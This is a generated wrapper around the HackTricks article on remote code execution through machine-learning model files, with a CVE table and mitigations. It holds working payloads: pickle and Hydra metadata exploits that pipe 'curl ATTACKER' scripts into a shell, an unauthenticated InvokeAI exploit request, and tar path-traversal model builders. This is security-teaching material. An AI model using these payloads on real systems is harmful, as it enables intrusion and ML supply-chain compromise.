---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Models RCE

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-ai-ai-models-rce` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/AI/AI-Models-RCE.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Models RCE](../../topics/ai/models-rce.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-ai-ai-models-rce |
| name | Models RCE |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/AI/AI-Models-RCE.md |

## Preserved Source Material

````yaml
_body: "# Models RCE\n\n{{#include ../banners/hacktricks-training.md}}\n\n## Loading models to RCE\n\nMachine Learning models\
  \ are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers\
  \ machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases\
  \ where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability\
  \ in the model loading library.\n\nAt the time of the writting these are some examples of this type of vulneravilities:\n\
  \n| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                 \
  \   | **RCE Vector**                                                                                                   \
  \                        | **References**                               |\n|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|\n\
  | **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                        \
  \                                      | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only`\
  \ safeguard)                                        | |\n| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**,\
  \ **CVE-2022-1471**                                                                         | SSRF + malicious model download\
  \ causes code execution; Java deserialization RCE in management API                                        | |\n| **NVIDIA\
  \ Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                  \
  \                         | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint`\
  \ → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |\n\
  | **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                 \
  \                                     | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with\
  \ **Lambda** layer runs arbitrary Python code          | |\n| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)\
  \                                                                                          | Crafted `.tflite` model triggers\
  \ integer overflow → heap corruption (potential RCE)                                                      | |\n| **Scikit-learn**\
  \ (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                      \
  \                     | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload         \
  \                                          | |\n| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*\
  \                                                                              | `numpy.load` default allowed pickled object\
  \ arrays – malicious `.npy/.npz` triggers code exec                                            | |\n| **ONNX / ONNX Runtime**\
  \     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                      \
  \              | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model\
  \ tar can overwrite arbitrary files (leading to RCE) | |\n| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control\
  \ flow                                                                                    | Model with custom operator requires\
  \ loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |\n| **NVIDIA\
  \ Triton Server**    | **CVE-2023-31036** (path traversal)                                                             \
  \                             | Using model-load API with `--model-control` enabled allows relative path traversal to write\
  \ files (e.g., overwrite `.bashrc` for RCE)    | |\n| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple\
  \ heap overflows)                                                                         | Malformed GGUF model file causes\
  \ heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |\n| **Keras\
  \ (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                           \
  \                              | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode\
  \ doesn’t cover old format – “downgrade attack”) | |\n| **Others** (general)        | *Design flaw* – Pickle serialization\
  \                                                                                         | Many ML tools (e.g., pickle-based\
  \ model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |\n| **NeMo\
  \ / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584,\
  \ FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) →\
  \ executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)\
  \ |\n\nMoreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security)\
  \ that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle\
  \ based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.\n\n\
  ### Hydra metadata → RCE (works even with safetensors)\n\n`hydra.utils.instantiate()` imports and calls any dotted `_target_`\
  \ in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker\
  \ can supply a callable and arguments that run immediately during model load (no pickle required).\n\nPayload example (works\
  \ in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):\n\n```yaml\n_target_: builtins.exec\n\
  _args_:\n  - \"import os; os.system('curl http://ATTACKER/x|bash')\"\n```\n\nKey points:\n- Triggered before model initialization\
  \ in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, and FlexTok loaders.\n- Hydra’s string block-list is\
  \ bypassable via alternative import paths (e.g., `enum.bltns.eval`) or application-resolved names (e.g., `nemo.core.classes.common.os.system`\
  \ → `posix`).\n- FlexTok also parses stringified metadata with `ast.literal_eval`, enabling DoS (CPU/memory blowup) before\
  \ the Hydra call.\n\n### \U0001F195  InvokeAI RCE via `torch.load` (CVE-2024-12029)\n\n`InvokeAI` is a popular open-source\
  \ web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that\
  \ lets users download and load models from arbitrary URLs.\n\nInternally the endpoint eventually calls:\n\n```python\ncheckpoint\
  \ = torch.load(path, map_location=torch.device(\"meta\"))\n```\n\nWhen the supplied file is a **PyTorch checkpoint (`*.ckpt`)**,\
  \ `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL,\
  \ an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed\
  \ **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.\n\nThe vulnerability was\
  \ assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).\n\n#### Exploitation walk-through\n\n1. Create a malicious checkpoint:\n\
  \n```python\n# payload_gen.py\nimport pickle, torch, os\n\nclass Payload:\n    def __reduce__(self):\n        return (os.system,\
  \ (\"/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'\",))\n\nwith open(\"payload.ckpt\", \"wb\") as f:\n    pickle.dump(Payload(),\
  \ f)\n```\n\n2. Host `payload.ckpt` on an HTTP server you control (e.g. `http://ATTACKER/payload.ckpt`).\n3. Trigger the\
  \ vulnerable endpoint (no authentication required):\n\n```python\nimport requests\n\nrequests.post(\n    \"http://TARGET:9090/api/v2/models/install\"\
  ,\n    params={\n        \"source\": \"http://ATTACKER/payload.ckpt\",  # remote model URL\n        \"inplace\": \"true\"\
  ,                         # write inside models dir\n        # the dangerous default is scan=false → no AV scan\n    },\n\
  \    json={},                                         # body can be empty\n    timeout=5,\n)\n```\n\n4. When InvokeAI downloads\
  \ the file it calls `torch.load()` → the `os.system` gadget runs and the attacker gains code execution in the context of\
  \ the InvokeAI process.\n\nReady-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates\
  \ the whole flow.\n\n#### Conditions\n\n•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)\n•  `/api/v2/models/install`\
  \ reachable by the attacker\n•  Process has permissions to execute shell commands\n\n#### Mitigations\n\n* Upgrade to **InvokeAI\
  \ ≥ 5.4.3** – the patch sets `scan=True` by default and performs malware scanning before deserialization.\n* When loading\
  \ checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)\
  \ helper.\n* Enforce allow-lists / signatures for model sources and run the service with least-privilege.\n\n> ⚠️ Remember\
  \ that **any** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) is inherently unsafe to\
  \ deserialize from untrusted sources.\n\n---\n\nExample of an ad-hoc mitigation if you must keep older InvokeAI versions\
  \ running behind a reverse proxy:\n\n```nginx\nlocation /api/v2/models/install {\n    deny all;                       #\
  \ block direct Internet access\n    allow 10.0.0.0/8;               # only internal CI network can call it\n}\n```\n\n###\
  \ \U0001F195 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)\n\nNVIDIA’s Transformers4Rec (part\
  \ of Merlin) exposed an unsafe checkpoint loader that directly called `torch.load()` on user-provided paths. Because `torch.load`\
  \ relies on Python `pickle`, an attacker-controlled checkpoint can execute arbitrary code via a reducer during deserialization.\n\
  \nVulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)`\
  \ → `torch.load(...)`.\n\nWhy this leads to RCE: In Python pickle, an object can define a reducer (`__reduce__`/`__setstate__`)\
  \ that returns a callable and arguments. The callable is executed during unpickling. If such an object is present in a checkpoint,\
  \ it runs before any weights are used.\n\nMinimal malicious checkpoint example:\n\n```python\nimport torch\n\nclass Evil:\n\
  \    def __reduce__(self):\n        import os\n        return (os.system, (\"id > /tmp/pwned\",))\n\n# Place the object\
  \ under a key guaranteed to be deserialized early\nckpt = {\n    \"model_state_dict\": Evil(),\n    \"trainer_state\": {\"\
  epoch\": 10},\n}\n\ntorch.save(ckpt, \"malicious.ckpt\")\n```\n\nDelivery vectors and blast radius:\n- Trojanized checkpoints/models\
  \ shared via repos, buckets, or artifact registries\n- Automated resume/deploy pipelines that auto-load checkpoints\n- Execution\
  \ happens inside training/inference workers, often with elevated privileges (e.g., root in containers)\n\nFix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)\
  \ (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`.\
  \ The new loader validates types/fields and prevents arbitrary callables from being invoked during load.\n\nDefensive guidance\
  \ specific to PyTorch checkpoints:\n- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index)\
  \ or ONNX when possible.\n- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch)\
  \ or use a custom allow-listed unpickler similar to the Transformers4Rec patch.\n- Enforce model provenance/signatures and\
  \ sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).\n- Monitor for unexpected\
  \ child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.\n\nPOC and vulnerable/patch\
  \ references:\n- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js\n- Malicious\
  \ checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js\n- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js\n\
  \n## Example – crafting a malicious PyTorch model\n\n- Create the model:\n\n```python\n# attacker_payload.py\nimport torch\n\
  import os\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        # This code will be executed when unpickled (e.g.,\
  \ on model.load_state_dict)\n        return (os.system, (\"echo 'You have been hacked!' > /tmp/pwned.txt\",))\n\n# Create\
  \ a fake model state dict with malicious content\nmalicious_state = {\"fc.weight\": MaliciousPayload()}\n\n# Save the malicious\
  \ state dict\ntorch.save(malicious_state, \"malicious_state.pth\")\n```\n\n- Load the model:\n\n```python\n# victim_load.py\n\
  import torch\nimport torch.nn as nn\n\nclass MyModel(nn.Module):\n    def __init__(self):\n        super().__init__()\n\
  \        self.fc = nn.Linear(10, 1)\n\nmodel = MyModel()\n\n# ⚠️ This will trigger code execution from pickle inside the\
  \ .pth file\nmodel.load_state_dict(torch.load(\"malicious_state.pth\", weights_only=False))\n\n# /tmp/pwned.txt is created\
  \ even if you get an error\n```\n\n### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)\n\
  \nTencent’s FaceDetection-DSFD exposes a `resnet` endpoint that deserializes user-controlled data. ZDI confirmed that a\
  \ remote attacker can coerce a victim to load a malicious page/file, have it push a crafted serialized blob to that endpoint,\
  \ and trigger deserialization as `root`, leading to full compromise.\n\nThe exploit flow mirrors typical pickle abuse:\n\
  \n```python\nimport pickle, os, requests\n\nclass Payload:\n    def __reduce__(self):\n        return (os.system, (\"curl\
  \ https://attacker/p.sh | sh\",))\n\nblob = pickle.dumps(Payload())\nrequests.post(\"https://target/api/resnet\", data=blob,\n\
  \              headers={\"Content-Type\": \"application/octet-stream\"})\n```\n\nAny gadget reachable during deserialization\
  \ (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport\
  \ was HTTP, WebSocket, or a file dropped into a watched directory.\n\n\n## Models to Path Traversal\n\nAs commented in [**this\
  \ blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used\
  \ by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats\
  \ to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.\n\nFor\
  \ example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:\n\
  \n```python\nimport tarfile\n\ndef escape(member):\n    member.name = \"../../tmp/hacked\"     # break out of the extract\
  \ dir\n    return member\n\nwith tarfile.open(\"traversal_demo.model\", \"w:gz\") as tf:\n    tf.add(\"harmless.txt\", filter=escape)\n\
  ```\n\nOr, with the following code you can create a model that will create a symlink to the `/tmp` directory when loaded:\n\
  \n```python\nimport tarfile, pathlib\n\nTARGET  = \"/tmp\"        # where the payload will land\nPAYLOAD = \"abc/hacked\"\
  \n\ndef link_it(member):\n    member.type, member.linkname = tarfile.SYMTYPE, TARGET\n    return member\n\nwith tarfile.open(\"\
  symlink_demo.model\", \"w:gz\") as tf:\n    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)\n    tf.add(PAYLOAD)  \
  \                    # rides the symlink\n```\n\n### Deep-dive: Keras .keras deserialization and gadget hunting\n\nFor a\
  \ focused guide on .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, and post-fix gadget discovery\
  \ inside the allowlist, see:\n\n\n{{#ref}}\n../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md\n\
  {{#endref}}\n\n## References\n\n- [OffSec blog – \"CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data\"](https://www.offsec.com/blog/cve-2024-12029/)\n\
  - [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)\n\
  - [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)\n\
  - [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)\n\
  - [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)\n\
  - [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)\n- [Transformers4Rec patch commit\
  \ b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)\n\
  - [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)\n- [Malicious\
  \ checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)\n- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)\n\
  - [Hugging Face Transformers](https://github.com/huggingface/transformers)\n- [Unit 42 – Remote Code Execution With Modern\
  \ AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)\n- [Hydra\
  \ instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)\n- [Hydra block-list commit (warning about\
  \ RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)\n\n{{#include ../banners/hacktricks-training.md}}"
_relative_path: AI/AI-Models-RCE.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/AI/AI-Models-RCE.md
````
